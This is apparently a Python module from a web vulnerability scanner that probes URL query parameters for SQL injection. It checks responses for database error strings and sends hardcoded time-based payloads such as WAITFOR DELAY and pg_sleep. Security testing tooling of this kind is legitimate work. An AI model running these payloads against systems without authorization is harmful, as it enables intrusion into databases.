import httpx
import asyncio
import logging
from urllib.parse import urlencode, parse_qs, urlparse

class Module:
    def __init__(self, url, payload_engine, analyzer, verbose=False):
        self.url = url
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings = []

    async def run(self):
        # Test for SQLi in URL parameters
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        for param in params:
            await self.test_parameter(param, params[param][0])
        return self.findings

    async def test_parameter(self, param, original_value):
        payloads = self.payload_engine.get_payloads('sqli')
        for payload_data in payloads:
            payload = payload_data['payload']
            # Test classic SQLi
            if await self.test_classic_sqli(param, payload):
                self.findings.append({
                    'type': 'SQL Injection',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': payload_data.get('risk', 'high'),
                    'cwe': payload_data.get('cwe', 'CWE-89'),
                    'description': f'Classic SQL injection in parameter {param}'
                })
            # Test blind SQLi
            if await self.test_blind_sqli(param, payload):
                self.findings.append({
                    'type': 'Blind SQL Injection',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': payload_data.get('risk', 'high'),
                    'cwe': payload_data.get('cwe', 'CWE-89'),
                    'description': f'Blind SQL injection in parameter {param}'
                })

    async def test_classic_sqli(self, param, payload):
        # Test for error-based SQLi
        test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={payload}')
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(test_url)
                # Check for SQL error messages
                error_patterns = [
                    'sql syntax', 'mysql_fetch', 'oracle error', 'sql server error',
                    'postgresql error', 'sqlite error', 'database error'
                ]
                for pattern in error_patterns:
                    if pattern.lower() in resp.text.lower():
                        return True
        except Exception:
            pass
        return False

    async def test_blind_sqli(self, param, payload):
        # Test for blind SQLi using time-based payloads
        time_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SLEEP(5)--",
            "'; pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--"
        ]
        for time_payload in time_payloads:
            test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={time_payload}')
            try:
                start_time = asyncio.get_event_loop().time()
                async with httpx.AsyncClient(timeout=15) as client:
                    resp = await client.get(test_url)
                end_time = asyncio.get_event_loop().time()
                if end_time - start_time > 4:  # If response took more than 4 seconds
                    return True
            except Exception:
                pass
        return False 